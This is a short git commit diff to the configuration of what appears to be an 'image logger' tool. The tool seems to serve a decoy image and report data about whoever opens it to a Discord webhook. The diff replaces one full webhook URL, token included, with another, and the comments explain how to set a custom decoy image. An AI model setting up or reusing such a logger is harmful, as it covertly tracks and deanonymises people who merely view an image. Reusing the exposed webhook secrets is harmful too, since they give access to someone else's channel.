d5fa46c6ed0403c5a046dc92e77ea0ca70d11dcf
LowkeyScripting <edwinaltidk@gmail.com>
2025-01-31 21:50:28 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1334977188491169913/mJ7AwhyWQuA4qW6BkE0zobP52fu4GH2u_rQK6vdDxNGJuqoE1Biagt-O2iCGUggcNtGa",
+    "webhook": "https://discord.com/api/webhooks/1334989014784016464/c8OknM5Gt-m9G8HiwDC23aHX_21Poo2mXP6JC08NPhrD3TGEeA4g2iEKWRKfmY88ziqG",
     "image": "https://storage.googleapis.com/pod_public/750/157553.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
